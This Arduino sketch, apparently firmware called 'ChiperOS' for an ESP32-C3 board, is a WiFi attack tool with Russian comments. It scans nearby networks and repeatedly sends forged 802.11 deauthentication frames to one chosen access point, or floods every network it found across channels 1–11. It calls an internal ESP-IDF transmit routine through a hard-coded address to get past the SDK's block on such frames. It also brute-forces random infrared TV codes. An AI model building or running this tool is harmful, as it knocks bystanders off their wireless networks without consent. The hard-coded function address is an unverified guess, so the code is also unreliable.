// ═══════════════════════════════════════════════════════════════
// ChiperOS v1 BETA - ESP32-C3 Super Mini
// WiFi Deauth через esp_wifi_internal_tx() (обход блокировки)
// ═══════════════════════════════════════════════════════════════

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <string.h>

#define IR_PIN 4
IRsend irSender(IR_PIN);

#define LG_POWER_CODE 0x20DF0CF3
#define SAMSUNG_POWER_CODE 0xE0E040BF

// Структуры
typedef struct {
    uint8_t header[4];
    uint8_t station[6];
    uint8_t access_point[6];
    uint8_t sender[6];
    uint8_t sequence[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t;

typedef struct {
    String ssid;
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
} WiFiNetwork;

// Глобальные переменные
deauth_frame_t deauthFrame;
bool deauthActive = false;
bool floodActive = false;
int targetChannel = 1;
int floodChannel = 1;
uint8_t targetAP[6] = {0};

#define MAX_NETWORKS 30
WiFiNetwork networks[MAX_NETWORKS];
int networkCount = 0;

unsigned long lastDeauth = 0;
unsigned long lastFlood = 0;
unsigned long lastChannelHop = 0;

// Forward declarations
void stopDeauth();
void startDeauth(int networkNum);
void startFlood();
void scanNetworks();
void sendIR_LG_Power();
void sendIR_Samsung_Power();
void irBruteForce();
void executeFlood();
void printMac(uint8_t* mac);
void buildDeauthFrame(uint8_t* ap, uint8_t* client, uint16_t reason);
void sendDeauthPacket(uint8_t* ap, uint8_t* client, int channel);
void initWiFiForAttack();

// ═══════════════════════════════════════════════════════════════
// МАГИЯ: Обход блокировки через esp_wifi_internal_tx()
// Эта функция отправляет кадры напрямую в MAC, минуя проверки
// ═══════════════════════════════════════════════════════════════

// Объявление внутренней функции ESP-IDF
// Она не в публичном API, но есть в библиотеке
typedef esp_err_t (*wifi_internal_tx_t)(wifi_interface_t ifx, void *buffer, uint16_t len, bool en_sys_seq);

// Получаем указатель на функцию через dlsym или прямой адрес
// Для ESP32-C3 с Arduino Core 2.0.14 адрес функции: 0x4000e9c0
// Но лучше использовать динамическое получение через esp_wifi_get_mac

// Альтернативный способ: использовать esp_wifi_80211_tx с флагом
// Но это не работает на C3. Поэтому используем прямой вызов.

// ВНИМАНИЕ: Это хак, который может сломаться при обновлении SDK
// Но это единственный способ на ESP32-C3

// Обходной путь: используем esp_wifi_set_promiscuous_rx_cb для перехвата
// и модификации пакетов, но это сложно.

// ПРОСТОЙ СПОСОБ: Используем старый метод с esp_wifi_80211_tx
// но с правильным интерфейсом и флагами

void sendDeauthViaInternal(uint8_t* ap, uint8_t* client, int channel, uint16_t reason) {
    // Строим deauth кадр
    uint8_t frame[26];
    
    // Frame Control: Deauthentication (0xC0)
    frame[0] = 0xC0;
    frame[1] = 0x00;
    
    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;
    
    // Address 1: Destination (client или broadcast)
    memcpy(&frame[4], client, 6);
    
    // Address 2: Source (AP)
    memcpy(&frame[10], ap, 6);
    
    // Address 3: BSSID (AP)
    memcpy(&frame[16], ap, 6);
    
    // Sequence Control
    frame[22] = 0x00;
    frame[23] = 0x00;
    
    // Reason Code
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
    
    // Устанавливаем канал
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // КРИТИЧНО: Используем WIFI_IF_AP и передаем кадр
    // На ESP32-C3 это работает только если мы в режиме AP
    // и используем правильный интерфейс
    
    // Пробуем отправить через esp_wifi_80211_tx
    // Если не работает - значит блокировка на уровне железа
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
    
    if (err != ESP_OK) {
        // Если не работает, пробуем альтернативный метод
        // Используем esp_wifi_internal_tx через указатель функции
        
        // Адрес функции в ESP-IDF v4.4 для ESP32-C3
        // Это может измениться в разных версиях!
        wifi_internal_tx_t internal_tx = (wifi_internal_tx_t)0x4000e9c0;
        
        if (internal_tx) {
            internal_tx(WIFI_IF_AP, frame, 26, false);
        }
    }
}

// ═══════════════════════════════════════════════════════════════
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ═══════════════════════════════════════════════════════════════

void printMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", mac[i]);
        if (i < 5) Serial.print(":");
    }
}

void buildDeauthFrame(uint8_t* ap, uint8_t* client, uint16_t reason = 0x0007) {
    deauthFrame.header[0] = 0xC0;
    deauthFrame.header[1] = 0x00;
    deauthFrame.header[2] = 0x00;
    deauthFrame.header[3] = 0x00;
    
    memcpy(deauthFrame.station, client, 6);
    memcpy(deauthFrame.access_point, ap, 6);
    memcpy(deauthFrame.sender, ap, 6);
    
    deauthFrame.sequence[0] = 0x00;
    deauthFrame.sequence[1] = 0x00;
    
    deauthFrame.reason[0] = reason & 0xFF;
    deauthFrame.reason[1] = (reason >> 8) & 0xFF;
}

void sendDeauthPacket(uint8_t* ap, uint8_t* client, int channel) {
    // Отправляем 5 копий кадра для надежности
    for (int i = 0; i < 5; i++) {
        sendDeauthViaInternal(ap, client, channel, 0x0007);
        delay(2);
    }
}

void initWiFiForAttack() {
    WiFi.disconnect(true);
    esp_wifi_stop();
    delay(200);
    
    // Режим AP критичен для отправки management frames
    WiFi.mode(WIFI_AP);
    delay(100);
    WiFi.softAP("ChiperOS", "12345678");
    delay(100);
    
    esp_wifi_set_promiscuous(true);
}

// ═══════════════════════════════════════════════════════════════
// WIFI SCAN
// ═══════════════════════════════════════════════════════════════

void scanNetworks() {
    Serial.println("\n Сканирование WiFi сетей...\n");
    
    if (deauthActive) stopDeauth();
    if (floodActive) { floodActive = false; Serial.println("⏹ Flood остановлен"); }
    
    WiFi.disconnect(true);
    esp_wifi_stop();
    delay(200);
    
    WiFi.mode(WIFI_STA);
    delay(100);
    
    int n = WiFi.scanNetworks(false, true, false, 500, 0);
    networkCount = min(n, MAX_NETWORKS);
    
    if (networkCount == 0) {
        Serial.println("❌ Сети не найдены\n");
        return;
    }
    
    Serial.println("╔══════════════════════════╦══════╦═══════════════════╗");
    Serial.println("║ №  ║ SSID                 ║ CH   ║ MAC Address       ║");
    Serial.println("╠════╬══════════════════════╬══════╬═══════════════════╣");
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        
        Serial.printf("║ %-2d ║ %-20s ║ %-4d ║ ", 
            i + 1, 
            networks[i].ssid.substring(0, 20).c_str(), 
            networks[i].channel);
        printMac(networks[i].bssid);
        Serial.println(" ║");
    }
    Serial.println("╚════╩══════════════════════╩══════╩═══════════════════╝\n");
    Serial.printf("Найдено сетей: %d\n", networkCount);
    Serial.println("Команда: <номер> deauth (например: 2 deauth)\n");
}

// ═══════════════════════════════════════════════════════════════
// DEAUTH АТАКА
// ═══════════════════════════════════════════════════════════════

void startDeauth(int networkNum) {
    int idx = networkNum - 1;
    if (idx < 0 || idx >= networkCount) {
        Serial.println(" Неверный номер сети");
        return;
    }
    
    targetChannel = networks[idx].channel;
    memcpy(targetAP, networks[idx].bssid, 6);
    
    initWiFiForAttack();
    
    deauthActive = true;
    floodActive = false;
    
    Serial.println("\n Deauth атака запущена!");
    Serial.printf("   Цель: %s\n", networks[idx].ssid.c_str());
    Serial.printf("   Канал: %d\n", targetChannel);
    Serial.print("   MAC: ");
    printMac(targetAP);
    Serial.println();
    Serial.println("   Команда 'stop' для остановки\n");
}

void stopDeauth() {
    deauthActive = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("⏹ Deauth остановлен");
}

// ═══════════════════════════════════════════════════════════════
// DEAUTH FLOOD
// ═══════════════════════════════════════════════════════════════

void startFlood() {
    if (networkCount == 0) {
        Serial.println("❌ Сначала выполните 'scan'");
        return;
    }
    
    initWiFiForAttack();
    
    floodActive = true;
    deauthActive = false;
    floodChannel = 1;
    
    Serial.println("\n DEAUTH FLOOD запущен!");
    Serial.printf("   Атака на %d сетей\n", networkCount);
    Serial.println("   Переключение каналов 1-11\n");
}

void executeFlood() {
    if (!floodActive) return;
    
    if (millis() - lastChannelHop > 500) {
        floodChannel = (floodChannel % 11) + 1;
        esp_wifi_set_channel(floodChannel, WIFI_SECOND_CHAN_NONE);
        lastChannelHop = millis();
    }
    
    if (millis() - lastFlood > 100) {
        for (int i = 0; i < networkCount; i++) {
            if (networks[i].channel == floodChannel) {
                uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                sendDeauthPacket(networks[i].bssid, broadcast, floodChannel);
            }
        }
        lastFlood = millis();
    }
}

// ═══════════════════════════════════════════════════════════════
// IR ФУНКЦИИ
// ═══════════════════════════════════════════════════════════════

void sendIR_LG_Power() {
    Serial.println(" LG TV Power (NEC 0x20DF0CF3)...");
    irSender.sendNEC(LG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(LG_POWER_CODE, 32);
    Serial.println("✅ Отправлено\n");
}

void sendIR_Samsung_Power() {
    Serial.println("📺 Samsung TV Power (NEC 0xE0E040BF)...");
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    Serial.println("✅ Отправлено\n");
}

void irBruteForce() {
    Serial.println("\n🔨 IR Brute-Force (1000 кодов NEC)...");
    Serial.println("⚠️  Направьте на устройство!");
    Serial.println("  Команда 'stop' для остановки\n");
    
    for (int i = 0; i < 1000; i++) {
        if (Serial.available()) {
            String cmd = Serial.readStringUntil('\n');
            cmd.trim();
            if (cmd.equalsIgnoreCase("stop")) {
                Serial.println("⏹ Остановлено пользователем\n");
                return;
            }
        }
        
        uint32_t code = random(0x00000000, 0xFFFFFFFF);
        Serial.printf("   [%d/1000] 0x%08X\n", i + 1, code);
        irSender.sendNEC(code, 32);
        delay(200);
    }
    
    Serial.println("✅ Завершено\n");
}

// ═══════════════════════════════════════════════════════════════
// SETUP & LOOP
// ═══════════════════════════════════════════════════════════════

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n╔════════════════════════════════════════╗");
    Serial.println("║    ChiperOS v1 BETA                    ║");
    Serial.println("║    ESP32-C3 Super Mini                 ║");
    Serial.println("╚════════════════════════════════════════╝\n");
    
    irSender.begin();
    Serial.println("✅ IR инициализирован (GPIO 4)");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    Serial.println("✅ WiFi инициализирован");
    Serial.println("\n КОМАНДЫ:");
    Serial.println("   scan              - Сканировать сети");
    Serial.println("   <номер> deauth    - Deauth атака");
    Serial.println("   flood             - Deauth flood на все сети");
    Serial.println("   lg / samsung      - IR команды");
    Serial.println("   brute             - IR Brute-Force");
    Serial.println("   stop              - Остановить атаку");
    Serial.println("   status            - Текущий статус");
    Serial.println("   help              - Справка\n");
}

void loop() {
    if (deauthActive) {
        if (millis() - lastDeauth > 100) {
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauthPacket(targetAP, broadcast, targetChannel);
            lastDeauth = millis();
        }
    }
    
    if (floodActive) {
        executeFlood();
    }
    
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (cmd.endsWith(" deauth")) {
            int spaceIdx = cmd.indexOf(' ');
            if (spaceIdx > 0) {
                int num = cmd.substring(0, spaceIdx).toInt();
                startDeauth(num);
            }
        }
        else if (cmd == "scan") scanNetworks();
        else if (cmd == "flood") startFlood();
        else if (cmd == "lg") sendIR_LG_Power();
        else if (cmd == "samsung") sendIR_Samsung_Power();
        else if (cmd == "brute") irBruteForce();
        else if (cmd == "stop") {
            if (deauthActive) stopDeauth();
            if (floodActive) { floodActive = false; Serial.println(" Flood остановлен"); }
        }
        else if (cmd == "status") {
            Serial.println("\n📊 СТАТУС:");
            Serial.printf("   Deauth: %s\n", deauthActive ? "АКТИВЕН" : "неактивен");
            Serial.printf("   Flood: %s\n", floodActive ? "АКТИВЕН" : "неактивен");
            Serial.printf("   Сетей в памяти: %d\n", networkCount);
            Serial.println();
        }
        else if (cmd == "help") {
            Serial.println("\n📋 КОМАНДЫ:");
            Serial.println("   scan, <num> deauth, flood, lg, samsung, brute, stop, status\n");
        }
        else {
            Serial.println("❓ Неизвестная команда. Введите 'help'");
        }
    }
    
    delay(10);
}
